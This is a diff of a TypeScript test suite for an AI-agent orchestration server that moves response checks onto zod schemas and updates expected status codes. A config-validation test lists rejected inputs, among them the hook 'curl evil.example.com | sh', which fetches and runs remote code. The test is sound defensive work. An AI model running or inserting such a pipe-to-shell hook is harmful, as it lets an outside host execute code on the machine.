@@ -12,6 +12,28 @@ import { sweepApproved } from "../src/mech/flow/start.ts";
 import { fakeSandbox } from "./fake-sandbox.ts";
 import { routeCalls } from "./route-source.ts";
 import { seedAuth } from "./seed-auth.ts";
+import { loadConfig } from "../src/config.ts";
+import { SnapshotSchema } from "../src/api/panel/shapes.ts";
+import { z } from "zod";
+import type { Json } from "../src/http/respond.ts";
+import type { Github } from "../src/mech/git/github.ts";
+
+const BoundaryPayload = z.object({ boundary: z.array(z.object({ id: z.number() })) });
+const BoundaryIdeasPayload = z.object({ boundary: z.array(z.object({ id: z.number(), idea: z.string() })) });
+const GroupIdResponse = z.object({ grp_id: z.number() });
+const IdeaResponse = GroupIdResponse.extend({ boundaryNeeded: z.boolean() });
+const MessageResponse = z.object({ message: z.string() });
+const PullRequestResponse = z.object({ number: z.number() });
+const StartedResponse = z.object({ started: z.array(z.number()) });
+const DirsResponse = z.object({
+  dirs: z.array(z.object({ name: z.string(), repo: z.boolean(), taken: z.boolean() })),
+  parent: z.string(),
+});
+const NotesResponse = z.object({
+  notes: z.array(
+    z.object({ kind: z.string(), grpId: z.number().nullable(), group: z.string().nullable() }).passthrough(),
+  ),
+});
 
 function harness(handle?: (cmd: string, cwd: string) => { code?: number; out?: string; err?: string }) {
   const db: DB = openMemory();
@@ -19,13 +41,14 @@ function harness(handle?: (cmd: string, cwd: string) => { code?: number; out?: s
   const bus = new Bus(db);
   const ran: Job[] = [];
   const sched = new Scheduler(db, async (j) => void ran.push(j));
+  const sandbox = fakeSandbox(handle);
   const ctx: Ctx = {
     db,
     bus,
     sched,
-    sandbox: fakeSandbox(handle),
+    sandbox,
     waiters: new Map(),
-    config: { language: "中文" },
+    config: loadConfig(),
   };
   const app = makeApp(ctx);
 
@@ -41,10 +64,10 @@ function harness(handle?: (cmd: string, cwd: string) => { code?: number; out?: s
   db.run(
     "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, 1, 'qa', 'sonnet', 'tok-qa', 0)",
   );
-  return { db, bus, sched, ctx, app, ran, engineer: "tok-eng", qa: "tok-qa" };
+  return { db, bus, sched, ctx, app, ran, sandbox, engineer: "tok-eng", qa: "tok-qa" };
 }
 
-const post = (app: (r: Request) => Promise<Response>, path: string, body?: unknown, token?: string) =>
+const post = (app: (r: Request) => Promise<Response>, path: string, body?: Json, token?: string) =>
   app(
     new Request(`http://x${path}`, {
       method: "POST",
@@ -56,8 +79,14 @@ const post = (app: (r: Request) => Promise<Response>, path: string, body?: unkno
     }),
   );
 const get = (app: (r: Request) => Promise<Response>, path: string) => app(new Request(`http://x${path}`));
+const state = async (app: (r: Request) => Promise<Response>) =>
+  SnapshotSchema.parse(await (await get(app, "/api/state")).json());
 const withToken = (app: (r: Request) => Promise<Response>, path: string, token: string) =>
   app(new Request(`http://x${path}`, { headers: { "x-orch-token": token } }));
+const githubAnswer = (data: Json): Github => ({
+  remaining: () => null,
+  request: async (_method, _path, schema) => ({ ok: true, status: 200, data: schema.parse(data) }),
+});
 
 test("an over-long journal is rejected with a reason the agent can act on", async () => {
   const { app } = harness();
@@ -68,7 +97,7 @@ test("an over-long journal is rejected with a reason the agent can act on", asyn
 
 test("journal writes a note and exports journal/retro into the checkout", async () => {
   const _wt = mkdtempSync(join(tmpdir(), "orch-wt-"));
-  const { app, db, ctx } = harness();
+  const { app, db, sandbox } = harness();
 
   const r = await post(
     app,
@@ -82,7 +111,7 @@ test("journal writes a note and exports journal/retro into the checkout", async 
 
   // Into the group's own checkout, which is inside its sandbox — so it merges
   // with the PR like any other file the group wrote.
-  const written = (ctx.sandbox as any).files.get("/work/docs/journal/g1/001-journal.md") as string;
+  const written = sandbox.files.get("/work/docs/journal/g1/001-journal.md")!;
   expect(written).toContain("kind: journal");
   expect(written).toContain("files: [auth/mw.ts]");
   expect(written).toContain("Moved token check into middleware.");
@@ -103,7 +132,7 @@ test("a fact never gets exported to git — only journal/retro/decision do", asy
 test("mail rejects intents outside the five", async () => {
   const { app } = harness();
   const r = await post(app, "/orch/mail", { target: "qa", intent: "handoff", body: "x" }, "tok-eng");
-  expect(r.status).toBe(422);
+  expect(r.status).toBe(400);
   expect(await r.text()).toContain("ask, request, inform, note, decision");
 });
 
@@ -170,7 +199,7 @@ test("ask-boss blocks the caller and a blocker pauses the whole group", async ()
   expect(ans.status).toBe(200);
 
   const r = await pending;
-  expect(await r.text()).toBe("use zod");
+  expect(await r.json()).toEqual({ message: "use zod" });
   expect(db.query<{ status: string }, []>("SELECT status FROM grp WHERE id = 1").get()!.status).toBe("RUNNING");
   expect(db.query<{ state: string }, [number]>("SELECT state FROM agent WHERE id = ?").get(1)!.state).toBe("idle");
 });
@@ -188,7 +217,7 @@ test("reserved ask-boss questions start at the boss after filing", async () => {
   expect(row).toEqual({ severity: "advisory", chain_state: "boss" });
 
   await post(app, "/api/escalations/1/answer", { answer: "do not disclose it" });
-  expect(await (await pending).text()).toBe("do not disclose it");
+  expect(await (await pending).json()).toEqual({ message: "do not disclose it" });
 });
 
 test("an unknown lease resource says how to get one added", async () => {
@@ -212,7 +241,7 @@ test("a lease with bad args never reaches the queue", async () => {
 test("dropping an idea creates a PLANNING group, a channel, and a dispatcher turn", async () => {
   const { app, db } = harness();
   const r = await post(app, "/api/ideas", { project_id: 1, text: "add rate limiting to the API" });
-  const { grp_id } = (await r.json()) as { grp_id: number };
+  const { grp_id } = GroupIdResponse.parse(await r.json());
 
   // PLANNING, not DRAFT: the Dispatcher has to run before there is anything to
   // approve, so "planning" and "waiting for the boss" cannot be one state.
@@ -241,7 +270,7 @@ test("the only group in a project skips the boundary step", async () => {
   const { app, db } = harness();
   db.run("UPDATE grp SET status = 'DISSOLVED' WHERE id = 1");
   const r = await post(app, "/api/ideas", { project_id: 1, text: "idea" });
-  const { grp_id, boundaryNeeded } = (await r.json()) as { grp_id: number; boundaryNeeded: boolean };
+  const { grp_id, boundaryNeeded } = IdeaResponse.parse(await r.json());
   expect(boundaryNeeded).toBe(false);
   const roles = db
     .query<{ payload_json: string }, [number]>("SELECT payload_json FROM job WHERE grp_id = ?")
@@ -253,7 +282,7 @@ test("the only group in a project skips the boundary step", async () => {
 test("the Dispatcher runs while PLANNING; a filed DRAFT then blocks until approval", async () => {
   const { app, db, sched, ran } = harness();
   const r = await post(app, "/api/ideas", { project_id: 1, text: "idea" });
-  const { grp_id } = (await r.json()) as { grp_id: number };
+  const { grp_id } = GroupIdResponse.parse(await r.json());
   await sched.drain();
   // Both planning turns DO run: without them the boss has nothing to approve.
   expect(ran.map((j) => JSON.parse(j.payload_json).role)).toEqual(["architect", "dispatcher"]);
@@ -314,7 +343,7 @@ test("the Dispatcher runs while PLANNING; a filed DRAFT then blocks until approv
 test("a malformed card is refused both when filed and when approved", async () => {
   const { app, db } = harness();
   const r = await post(app, "/api/ideas", { project_id: 1, text: "idea" });
-  const { grp_id } = (await r.json()) as { grp_id: number };
+  const { grp_id } = GroupIdResponse.parse(await r.json());
   db.run(
     "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, ?, 'dispatcher', 'm', 'tok-disp', 0)",
     [grp_id],
@@ -335,7 +364,7 @@ test("a malformed card is refused both when filed and when approved", async () =
 test("sending a DRAFT back records the reason and re-runs the dispatcher", async () => {
   const { app, db } = harness();
   const r = await post(app, "/api/ideas", { project_id: 1, text: "idea" });
-  const { grp_id } = (await r.json()) as { grp_id: number };
+  const { grp_id } = GroupIdResponse.parse(await r.json());
   await post(app, `/api/draft/${grp_id}/reject`, { reason: "wrong layer" });
 
   const notes = db.query<{ body: string }, [number]>("SELECT body FROM note WHERE grp_id = ? ORDER BY id").all(grp_id);
@@ -392,7 +421,7 @@ test("ctx query is capped so it never costs more than the file it replaces", asy
   for (let i = 0; i < 200; i++) ins.run(`middleware note ${i} ` + "x".repeat(400));
 
   const r = await post(app, "/orch/ctx/query", { question: "middleware token check" }, "tok-eng");
-  const out = await r.text();
+  const { message: out } = MessageResponse.parse(await r.json());
   expect(out.length).toBeLessThanOrEqual(16_000);
   expect(out).toContain("middleware");
 });
@@ -410,8 +439,8 @@ test("ctx query with no hits tells the agent what to do instead of returning jun
 
 test("state snapshot carries everything the three views need", async () => {
   const { app } = harness();
-  const s = (await (await get(app, "/api/state")).json()) as Record<string, unknown[]>;
-  for (const k of ["projects", "groups", "slices", "agents", "tasks", "escalations"]) {
+  const s = await state(app);
+  for (const k of ["projects", "groups", "slices", "agents", "tasks", "escalations"] as const) {
     expect(Array.isArray(s[k])).toBe(true);
   }
   expect(s.agents!.length).toBe(2);
@@ -467,7 +496,7 @@ test("the token decides which agent acted, not anything in the body", async () =
 test("filing the card drops the group's other queued planning turns", async () => {
   const { app, db, sched } = harness();
   const r = await post(app, "/api/ideas", { project_id: 1, text: "idea" });
-  const { grp_id } = (await r.json()) as { grp_id: number };
+  const { grp_id } = GroupIdResponse.parse(await r.json());
   db.run(
     "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, ?, 'dispatcher', 'm', 'tok-disp', 0)",
     [grp_id],
@@ -510,7 +539,7 @@ test("a group name is short and branch-shaped, whatever the idea looked like", a
 test("a group can be named instead of numbered, everywhere it is referenced", async () => {
   const { app, db } = harness();
   const r = await post(app, "/api/ideas", { project_id: 1, text: "greet lang parameter" });
-  const { grp_id } = (await r.json()) as { grp_id: number };
+  const { grp_id } = GroupIdResponse.parse(await r.json());
   const name = db.query<{ name: string }, [number]>("SELECT name FROM grp WHERE id = ?").get(grp_id)!.name;
   db.run(
     "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, ?, 'dispatcher', 'm', 'tok-disp', 0)",
@@ -539,7 +568,7 @@ test("a group can be named instead of numbered, everywhere it is referenced", as
 test("the state snapshot carries the filed card so the boss can see what they approve", async () => {
   const { app, db } = harness();
   const r = await post(app, "/api/ideas", { project_id: 1, text: "greet lang" });
-  const { grp_id } = (await r.json()) as { grp_id: number };
+  const { grp_id } = GroupIdResponse.parse(await r.json());
   db.run(
     "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, ?, 'dispatcher', 'm', 'tok-disp', 0)",
     [grp_id],
@@ -556,8 +585,8 @@ test("the state snapshot carries the filed card so the boss can see what they ap
 名字 : state-carries-card`;
   await post(app, "/orch/draft", { group_id: grp_id, card }, "tok-disp");
 
-  const s = (await (await get(app, "/api/state")).json()) as any;
-  const filed = s.draftCards.find((c: any) => c.grpId === grp_id);
+  const s = await state(app);
+  const filed = s.draftCards.find((card) => card.grpId === grp_id);
   // Showing an empty box and asking for approval is asking the boss to approve
   // something they cannot see.
   expect(filed?.body).toContain("支持 zh");
@@ -570,8 +599,8 @@ test("the state snapshot carries the filed card so the boss can see what they ap
     "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, NULL, 'architect', 'm', 'tok-arch', 0)",
   );
   await post(app, "/orch/mail", { target: "dispatcher", intent: "inform", body: "反对：第三片与验收冲突" }, "tok-arch");
-  const s2 = (await (await get(app, "/api/state")).json()) as any;
-  const late = (s2.lateObjections ?? []).find((o: any) => o.grpId === grp_id);
+  const s2 = await state(app);
+  const late = s2.lateObjections.find((objection) => objection.grpId === grp_id);
   expect(late?.body).toContain("与验收冲突");
   expect(late?.author).toBe("architect");
 });
@@ -580,14 +609,14 @@ test("a second group triggers boundaries for every undeclared group, not just th
   const { app, db } = harness();
   // The pre-existing group has no owns: it was the only group when it started.
   const r = await post(app, "/api/ideas", { project_id: 1, text: "second idea" });
-  const { grp_id } = (await r.json()) as { grp_id: number };
+  const { grp_id } = GroupIdResponse.parse(await r.json());
 
   const boundary = db
     .query<{ payload_json: string }, [number]>(
       "SELECT payload_json FROM job WHERE grp_id = ? AND payload_json LIKE '%architect%'",
     )
     .get(grp_id)!;
-  const groups = JSON.parse(boundary.payload_json).boundary as Array<{ id: number }>;
+  const groups = BoundaryPayload.parse(JSON.parse(boundary.payload_json)).boundary;
   // An undeclared group beside a declared one is the same risk the rule exists to
   // prevent, just reached from the other direction.
   expect(groups.map((g) => g.id).sort()).toEqual([1, grp_id].sort());
@@ -597,40 +626,40 @@ test("a group that already declared its paths is not asked again", async () => {
   const { app, db } = harness();
   db.run("UPDATE grp SET owns_json = ? WHERE id = 1", [JSON.stringify(["src/auth/**"])]);
   const r = await post(app, "/api/ideas", { project_id: 1, text: "second idea" });
-  const { grp_id } = (await r.json()) as { grp_id: number };
+  const { grp_id } = GroupIdResponse.parse(await r.json());
   const boundary = db
     .query<{ payload_json: string }, [number]>(
       "SELECT payload_json FROM job WHERE grp_id = ? AND payload_json LIKE '%architect%'",
     )
     .get(grp_id)!;
-  expect((JSON.parse(boundary.payload_json).boundary as any[]).map((g) => g.id)).toEqual([grp_id]);
+  expect(BoundaryPayload.parse(JSON.parse(boundary.payload_json)).boundary.map((group) => group.id)).toEqual([grp_id]);
 });
 
 test("the snapshot carries the boss's original words alongside the card", async () => {
   const { app, db } = harness();
   const idea = "greet 现在只支持英文，加一个可选的语言参数";
   const r = await post(app, "/api/ideas", { project_id: 1, text: idea });
-  const { grp_id } = (await r.json()) as { grp_id: number };
+  const { grp_id } = GroupIdResponse.parse(await r.json());
 
-  const s = (await (await get(app, "/api/state")).json()) as any;
+  const s = await state(app);
   // The 20 seconds on the card are the only guard against a well-formed plan
   // aimed at the wrong thing, and that comparison needs the original next to it.
-  expect(s.ideas.find((i: any) => i.grpId === grp_id)?.body).toBe(idea);
+  expect(s.ideas.find((item) => item.grpId === grp_id)?.body).toBe(idea);
 
   // The first thing the boss said, not the latest — later messages are feedback.
   db.run(
     "INSERT INTO event (grp_id, author, kind, body, at) VALUES (?, 'boss', 'boss_say', 'and also make it fast', 999)",
     [grp_id],
   );
-  const s2 = (await (await get(app, "/api/state")).json()) as any;
-  expect(s2.ideas.find((i: any) => i.grpId === grp_id)?.body).toBe(idea);
+  const s2 = await state(app);
+  expect(s2.ideas.find((item) => item.grpId === grp_id)?.body).toBe(idea);
 });
 
 test("an approval a boundary blocks is recorded, not thrown away", async () => {
   const { app, db } = harness();
   db.run("UPDATE grp SET owns_json = ? WHERE id = 1", [JSON.stringify(["src/**"])]);
   const r = await post(app, "/api/ideas", { project_id: 1, text: "second idea" });
-  const { grp_id } = (await r.json()) as { grp_id: number };
+  const { grp_id } = GroupIdResponse.parse(await r.json());
   db.run(
     "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, ?, 'dispatcher', 'm', 'tok-d', 0)",
     [grp_id],
@@ -673,7 +702,7 @@ async function blocked(h: ReturnType<typeof harness>) {
   const { app, db } = h;
   db.run("UPDATE grp SET owns_json = ? WHERE id = 1", [JSON.stringify(["src/a/**"])]);
   const r = await post(app, "/api/ideas", { project_id: 1, text: "second idea" });
-  const { grp_id } = (await r.json()) as { grp_id: number };
+  const { grp_id } = GroupIdResponse.parse(await r.json());
   db.run("UPDATE grp SET status = 'DRAFT', owns_json = ? WHERE id = ?", [JSON.stringify(["src/a/mw.ts"]), grp_id]);
   db.run(
     "INSERT INTO note (project_id, grp_id, kind, lang, body, frontmatter_json, at) VALUES (1, ?, 'fact', 'zh', ?, ?, 0)",
@@ -791,7 +820,7 @@ test("dropping a requirement frees its paths and starts whoever was waiting", as
 
   const r = await post(h.app, "/api/groups/1/drop", { why: "grp2 covers it" });
   expect(r.status).toBe(200);
-  expect((await r.json()) as any).toEqual({ started: [grpId] });
+  expect(StartedResponse.parse(await r.json())).toEqual({ started: [grpId] });
 
   const q = (sql: string) => h.db.query<{ v: string }, []>(sql).get()!.v;
   expect(q("SELECT status AS v FROM grp WHERE id = 1")).toBe("DISSOLVED");
@@ -813,7 +842,7 @@ test("a planner may propose dropping already-covered work, but only with evidenc
     "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, 1, 'dispatcher', 'm', 'tok-d', 0)",
   );
   h.db.run("INSERT INTO grp (project_id, name, status, created_at) VALUES (1, 'other', 'RUNNING', 0)");
-  const drop = (b: unknown, tok = "tok-d") => post(h.app, "/orch/drop", b, tok);
+  const drop = (b: Json, tok = "tok-d") => post(h.app, "/orch/drop", b, tok);
 
   expect((await drop({ group_id: 1, why: "已经做完了" })).status).toBe(422);
   expect((await drop({ group_id: 1, why: "短", duplicate: 2 })).status).toBe(422);
@@ -822,8 +851,9 @@ test("a planner may propose dropping already-covered work, but only with evidenc
   expect((await drop({ group_id: 1, why: "grp2 已经覆盖了这件事", duplicate: 2 }, "tok-eng")).status).toBe(422);
 
   expect((await drop({ group_id: 1, why: "grp2 已经覆盖了这件事", duplicate: 2 })).status).toBe(200);
-  const st = (await (await get(h.app, "/api/state")).json()) as any;
-  const p = st.dropProposals.find((x: any) => x.grpId === 1);
+  const st = await state(h.app);
+  const p = st.dropProposals.find((proposal) => proposal.grpId === 1);
+  if (!p) throw new Error("drop proposal missing from snapshot");
   expect(p.body).toContain("grp2 已经覆盖");
   expect(p.body).toContain("other");
   // Still the boss's call: proposing does not dissolve anything.
@@ -836,14 +866,14 @@ test("the boundary request quotes each group's own requirement", async () => {
   // tell the groups apart — observed live, it gave one group the other's files.
   db.run("INSERT INTO event (grp_id, author, kind, body, at) VALUES (1, 'boss', 'boss_say', 'greet 加中文支持', 1)");
   const r = await post(app, "/api/ideas", { project_id: 1, text: "farewell: bye(name) 返回 goodbye X" });
-  const { grp_id } = (await r.json()) as { grp_id: number };
+  const { grp_id } = GroupIdResponse.parse(await r.json());
 
   const job = db
     .query<{ payload_json: string }, [number]>(
       "SELECT payload_json FROM job WHERE grp_id = ? AND payload_json LIKE '%architect%'",
     )
     .get(grp_id)!;
-  const boundary = JSON.parse(job.payload_json).boundary as Array<{ id: number; idea: string }>;
+  const boundary = BoundaryIdeasPayload.parse(JSON.parse(job.payload_json)).boundary;
   expect(boundary.find((g) => g.id === 1)?.idea).toContain("greet");
   expect(boundary.find((g) => g.id === grp_id)?.idea).toContain("bye");
 });
@@ -865,19 +895,12 @@ test("registering a repo you cannot push to succeeds, and says so at once", asyn
   // `if` plus an emit is exactly what gets tidied away by someone who does not
   // know why it is there.
   const { app, db, ctx } = harness();
-  ctx.gh = {
-    remaining: () => null,
-    request: async <T>() => ({
-      ok: true as const,
-      status: 200,
-      data: {
-        full_name: "someone/theirs",
-        default_branch: "main",
-        clone_url: "https://github.com/someone/theirs.git",
-        permissions: { pull: true, push: false },
-      } as T,
-    }),
-  };
+  ctx.gh = githubAnswer({
+    full_name: "someone/theirs",
+    default_branch: "main",
+    clone_url: "https://github.com/someone/theirs.git",
+    permissions: { pull: true, push: false },
+  });
 
   const r = await post(app, "/api/projects", { repo: "someone/theirs" });
   expect(r.status).toBe(200);
@@ -905,15 +928,15 @@ test("the directory list marks git repos and what is already registered", async 
 
   const r = await get(app, `/api/dirs?path=${encodeURIComponent(root)}`);
   expect(r.status).toBe(200);
-  const out = (await r.json()) as any;
+  const out = DirsResponse.parse(await r.json());
   // Repos first: the boss is looking for one, so burying them under plain folders
   // makes the picker useless in a deep tree.
-  expect(out.dirs.map((d: any) => d.name)).toEqual(["b-repo", "c-taken", "a-plain"]);
-  expect(out.dirs.find((d: any) => d.name === "b-repo").repo).toBe(true);
-  expect(out.dirs.find((d: any) => d.name === "c-taken").taken).toBe(true);
-  expect(out.dirs.find((d: any) => d.name === "a-plain").repo).toBe(false);
+  expect(out.dirs.map((dir) => dir.name)).toEqual(["b-repo", "c-taken", "a-plain"]);
+  expect(out.dirs.find((dir) => dir.name === "b-repo")?.repo).toBe(true);
+  expect(out.dirs.find((dir) => dir.name === "c-taken")?.taken).toBe(true);
+  expect(out.dirs.find((dir) => dir.name === "a-plain")?.repo).toBe(false);
   // Dotfiles are noise in a picker.
-  expect(out.dirs.some((d: any) => d.name === ".hidden")).toBe(false);
+  expect(out.dirs.some((dir) => dir.name === ".hidden")).toBe(false);
   expect(out.parent).toBe(dirname(root));
 });
 
@@ -928,11 +951,11 @@ test("a closed PR whose branch cannot be reopened can still get a new one", asyn
   const { app, db, ctx } = harness();
   db.run("UPDATE grp SET status = 'PAUSED', pr_number = 7, branch = 'orch/g1' WHERE id = 1");
   db.run("UPDATE project SET remote = 'git@github.com:me/x.git' WHERE id = 1");
-  ctx.gh = { remaining: () => null, request: async <T>() => ({ ok: true, status: 200, data: { number: 9 } as T }) };
+  ctx.gh = githubAnswer({ number: 9 });
 
   const r = await post(app, "/api/groups/1/newpr");
   expect(r.status).toBe(200);
-  expect((await r.json()).number).toBe(9);
+  expect(PullRequestResponse.parse(await r.json()).number).toBe(9);
   const g = db
     .query<{ status: string; pr_number: number; merge_seq: number }, []>(
       "SELECT status, pr_number, merge_seq FROM grp WHERE id = 1",
@@ -956,10 +979,7 @@ test("a failed second PR leaves the old number in place rather than none at all"
   // A GitHub that would happily open the PR. Without a number here the create
   // answers "no PR number in it" and the route 422s for a reason that has
   // nothing to do with the push — the test passes and asserts nothing.
-  ctx.gh = {
-    remaining: () => null,
-    request: async <T>() => ({ ok: true, status: 200, data: { number: 9 } as T }),
-  };
+  ctx.gh = githubAnswer({ number: 9 });
 
   expect((await post(app, "/api/groups/1/newpr")).status).toBe(422);
   expect(db.query<{ pr_number: number }, []>("SELECT pr_number FROM grp WHERE id = 1").get()!.pr_number).toBe(7);
@@ -977,15 +997,15 @@ test("nobody confirms a merge by hand: GitHub is the only source, and it winds t
   // action" is an answer rather than a missing page — which is the honest reply,
   // since `/api/groups/1/…` is very much a route that exists.
   const no = await post(app, "/api/groups/1/landed");
-  expect(no.status).toBe(422);
+  expect(no.status).toBe(400);
   expect(await no.text()).toContain("action");
   expect(db.query<{ status: string }, []>("SELECT status FROM grp WHERE id = 1").get()!.status).toBe("PR_OPEN");
 
   // What `pollPrs` calls when GitHub says MERGED. Delivered, and still visible.
   landGroup(ctx, 1, "github");
-  const snap = (await (await get(app, "/api/state")).json()) as any;
-  expect(snap.groups.some((g: any) => g.id === 1)).toBe(false);
-  expect(snap.archived.map((g: any) => g.name)).toEqual(["g1"]);
+  const snap = await state(app);
+  expect(snap.groups.some((group) => group.id === 1)).toBe(false);
+  expect(snap.archived.map((group) => group.name)).toEqual(["g1"]);
 });
 
 test("raising a budget resumes the group and closes the question that asked", async () => {
@@ -1024,7 +1044,7 @@ test("a sent-back DRAFT stops being approvable", async () => {
   await post(app, "/api/draft/1/reject", { reason: "切得太粗" });
   expect(db.query<{ status: string }, []>("SELECT status FROM grp WHERE id = 1").get()!.status).toBe("PLANNING");
   // The rejected card is no longer offered as a decision.
-  const snap = (await (await get(app, "/api/state")).json()) as any;
+  const snap = await state(app);
   expect(snap.draftCards).toEqual([]);
 });
 
@@ -1033,7 +1053,7 @@ test("the boss can talk to the team, and triage decides what the words mean", as
   db.run(
     "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, 1, 'pm', 'sonnet', 'tok-pm', 0)",
   );
-  expect((await post(app, "/api/say", { group_id: 1, body: "" })).status).toBe(422);
+  expect((await post(app, "/api/say", { group_id: 1, body: "" })).status).toBe(400);
 
   expect((await post(app, "/api/say", { group_id: 1, body: "测试写得太浅" })).status).toBe(200);
   const woken = ran.filter((j) => j.kind === "agent_turn");
@@ -1061,16 +1081,16 @@ test("the blackboard is readable: notes by project, by group, and by kind", asyn
      VALUES (1, 1, 'decision', '中文', 'card', '{"draft_card":1}', 30)`,
   );
 
-  const all = (await (await get(app, "/api/notes?project=1")).json()) as any;
-  expect(all.notes.map((n: any) => n.kind)).toEqual(["lesson", "journal"]);
+  const all = NotesResponse.parse(await (await get(app, "/api/notes?project=1")).json());
+  expect(all.notes.map((note) => note.kind)).toEqual(["lesson", "journal"]);
   // A project-level lesson has no group, and that is exactly where it matters.
-  expect(all.notes.find((n: any) => n.kind === "lesson").grpId).toBe(null);
-  expect(all.notes.find((n: any) => n.kind === "journal").group).toBe("g1");
+  expect(all.notes.find((note) => note.kind === "lesson")?.grpId).toBe(null);
+  expect(all.notes.find((note) => note.kind === "journal")?.group).toBe("g1");
 
-  const one = (await (await get(app, "/api/notes?group=1")).json()) as any;
-  expect(one.notes.map((n: any) => n.kind)).toEqual(["journal"]);
+  const one = NotesResponse.parse(await (await get(app, "/api/notes?group=1")).json());
+  expect(one.notes.map((note) => note.kind)).toEqual(["journal"]);
 
-  const kind = (await (await get(app, "/api/notes?project=1&kind=lesson")).json()) as any;
+  const kind = NotesResponse.parse(await (await get(app, "/api/notes?project=1&kind=lesson")).json());
   expect(kind.notes.length).toBe(1);
 });
 
@@ -1182,7 +1202,7 @@ test("a group blocked outside its boundary hands the work on and waits for it", 
     return m ? { code: present.has(m[1]!) ? 0 : 1 } : {};
   });
   h.db.run("UPDATE grp SET owns_json = ? WHERE id = 1", [JSON.stringify(["src/a/**"])]);
-  const blocked = (b: unknown, tok = "tok-eng") => post(h.app, "/orch/blocked", b, tok);
+  const blocked = (b: Json, tok = "tok-eng") => post(h.app, "/orch/blocked", b, tok);
 
   expect((await blocked({ group_id: 1, path: "tsconfig.json" })).status).toBe(422);
   // An invented path must not be able to stop a group. The `--why` here is long
@@ -1199,7 +1219,7 @@ test("a group blocked outside its boundary hands the work on and waits for it", 
 
   const r = await blocked({ group_id: 1, path: "package.json", why: "缺 allowImportingTsExtensions，闸门必红" });
   expect(r.status).toBe(200);
-  const target = ((await r.json()) as any).blocked_on as number;
+  const target = z.object({ blocked_on: z.number() }).parse(await r.json()).blocked_on;
 
   const me = h.db
     .query<{ status: string; blocked_on: number | null }, []>("SELECT status, blocked_on FROM grp WHERE id = 1")
@@ -1229,7 +1249,7 @@ test("a live group that owns the path gets it as an addition, not a rival group"
     { group_id: 1, path: "package.json", why: "缺一行配置，闸门必红" },
     "tok-eng",
   );
-  expect(((await r.json()) as any).handedTo).toBe("owner");
+  expect(z.object({ handedTo: z.string() }).parse(await r.json()).handedTo).toBe("owner");
   const p = JSON.parse(
     h.db
       .query<{ payload_json: string }, []>("SELECT payload_json FROM job WHERE grp_id = 2 ORDER BY id DESC LIMIT 1")
@@ -1253,7 +1273,7 @@ test("a question no answer can resolve becomes a requirement, and the group wait
 
   const r = await post(h.app, "/api/escalations/1/requirement", { text: "加 allowImportingTsExtensions" });
   expect(r.status).toBe(200);
-  const { grp_id } = (await r.json()) as { grp_id: number };
+  const { grp_id } = GroupIdResponse.parse(await r.json());
 
   const made = h.db.query<{ status: string }, [number]>("SELECT status FROM grp WHERE id = ?").get(grp_id)!;
   expect(made.status).toBe("PLANNING");
@@ -1419,7 +1439,7 @@ test("project config validates the values that runtime consumers receive", async
   // let `{sandbox:{image:7}}` throw a 500 in `.trim()`, while a string
   // `denyDomains` persisted and reached the network layer as if it were string[].
   const h = harness();
-  const patch = (b: unknown) =>
+  const patch = (b: Json) =>
     h.app(
       new Request("http://x/api/project/1/config", {
         method: "POST",
@@ -1432,14 +1452,15 @@ test("project config validates the values that runtime consumers receive", async
 
   expect((await patch({ install: "bun install" })).status).toBe(200);
   const before = stored();
-  for (const body of [
+  const invalidBodies: Json[] = [
     { hooks: "curl evil.example.com | sh" },
     { gates: ["lint@ci"] },
     { sandbox: { image: 7 } },
     { sandbox: { denyDomains: "evil.example.com" } },
-  ]) {
+  ];
+  for (const body of invalidBodies) {
     const r = await patch(body);
-    expect(r.status).toBe(422);
+    expect(r.status).toBe(400);
     expect(stored()).toBe(before);
   }
 });
@@ -1492,7 +1513,7 @@ test("malformed JSON cannot become an empty control request", async () => {
   );
 
   expect(r.status).toBe(400);
-  expect(await r.text()).toContain("invalid JSON");
+  expect(await r.text()).toContain("Malformed JSON in request body");
   expect(h.db.query<{ status: string }, []>("SELECT status FROM grp WHERE id = 1").get()!.status).toBe("RUNNING");
 });
 
@@ -1503,12 +1524,12 @@ test("path ids are decimal records, not JavaScript number expressions", async ()
   );
 
   const bad = await h.app(new Request("http://x/api/projects/0x10", { method: "DELETE" }));
-  expect(bad.status).toBe(422);
-  expect(await bad.text()).toContain("id:");
+  expect(bad.status).toBe(400);
+  expect(await bad.json()).toEqual({ error: expect.stringContaining("id") });
   expect(h.db.query<{ name: string }, []>("SELECT name FROM project WHERE id = 16").get()?.name).toBe("sixteen");
 
   const action = await post(h.app, "/api/groups/0x1/pause");
-  expect(action.status).toBe(422);
+  expect(action.status).toBe(400);
   expect(h.db.query<{ status: string }, []>("SELECT status FROM grp WHERE id = 1").get()!.status).toBe("RUNNING");
 });
 
@@ -1519,8 +1540,7 @@ test("every route that takes a body declares its shape", () => {
   const undeclared = routeCalls()
     .filter(({ method, body }) => ["post", "put", "patch"].includes(method) && !body)
     .map(({ path }) => path);
-  // The exceptions, named rather than tolerated: multipart upload reads
-  // `req.formData()` itself, and the rest take no body at all.
+  // The exceptions, named rather than tolerated: these routes take no body at all.
   expect(undeclared).toEqual([
     // Login flows: the POST *is* the whole request. It starts or cancels a flow
     // and carries nothing.
@@ -1532,8 +1552,6 @@ test("every route that takes a body declares its shape", () => {
     // Buttons. Both act on the sandbox server and take no argument.
     "/sandbox-server/restart",
     "/sandbox-server/start",
-    // Multipart: it reads `req.formData()` itself, which no JSON schema describes.
-    "/attach",
     // A withdrawal, identified entirely by the id in the path.
     "/escalations/:id/revoke",
   ]);
